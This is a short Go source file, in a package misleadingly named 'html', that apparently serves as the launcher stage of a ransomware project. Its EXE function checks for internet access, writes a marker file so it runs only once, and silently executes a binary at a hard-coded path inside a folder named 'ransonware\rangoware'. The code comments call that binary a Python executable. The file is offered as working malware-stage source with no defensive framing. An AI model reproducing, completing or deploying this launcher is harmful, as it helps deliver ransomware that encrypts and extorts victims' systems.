package html

import (
    "fmt"
    "net"
    "os"
    "os/exec"
    "time"
)

func hasInternetConnection() bool {
    _, err := net.Dial("tcp", "www.google.com:80")
    return err == nil
}

func EXE() {
    // Check for an internet connection
    if !hasInternetConnection() {
        fmt.Println("No internet connection. Waiting for 1 minute...")
        time.Sleep(1 * time.Minute)
    }

    // Specify the path to your Python executable
    pythonExePath := "C:\\Users\\HP\\Desktop\\ransonware\\rangoware\\package-html\\go.exe"

    // Define a mark file
    markFilePath := "ran_successfully.txt"

    // Check if the mark file exists
    if _, err := os.Stat(markFilePath); err != nil {
        // The mark file doesn't exist
        // Create the mark file
        markFile, markErr := os.Create(markFilePath)
        if markErr != nil {
            fmt.Println("Error creating mark file:", markErr)
        }
        markFile.Close()

        // Run the Python executable
        cmd := exec.Command(pythonExePath)

        // Capture the standard output and error
        stdout, err := cmd.CombinedOutput()
        if err != nil {
            fmt.Println("Error running Python script:", err)
            return
        }

        // Print the output
        fmt.Printf("Python executable output:\n%s\n", stdout)
    } else {
        fmt.Println("Code has already run successfully. Skipping.")
    }
}
